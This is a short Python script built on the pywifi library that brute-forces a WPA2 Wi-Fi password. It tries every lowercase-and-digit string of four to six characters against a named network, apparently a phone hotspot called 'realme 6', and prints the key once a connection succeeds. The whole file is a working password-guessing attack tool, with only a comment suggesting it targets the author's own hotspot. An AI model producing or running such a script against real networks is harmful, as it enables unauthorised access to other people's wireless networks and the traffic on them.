import pywifi
from pywifi import const
import time
import itertools
import string

def wifi_connect(ssid, password):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.disconnect()
    time.sleep(1)
    
    if iface.status() == const.IFACE_DISCONNECTED:
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password
        
        iface.remove_all_network_profiles()
        temp_profile = iface.add_network_profile(profile)
        iface.connect(temp_profile)
        time.sleep(5)
        
        if iface.status() == const.IFACE_CONNECTED:
            print(f"[+] Password found: {password}")
            return True
        else:
            print(f"[-] Wrong Password: {password}")
            return False
    else:
        print("[-] Error in disconnecting")
        return False

def generate_passwords(charset, length):
    return (''.join(candidate) for candidate in itertools.product(charset, repeat=length))

def main():
    ssid = "realme 6"  # Replace with your Mobile Hotspot SSID
    charset = string.ascii_lowercase + string.digits  # Characters to try: lowercase letters + digits
    min_length = 4
    max_length = 6

    for length in range(min_length, max_length + 1):
        for password in generate_passwords(charset, length):
            print(f"Trying password: {password}")
            if wifi_connect(ssid, password):
                print(f"[+] Successfully connected with password: {password}")
                return

if __name__ == "__main__":
    main()
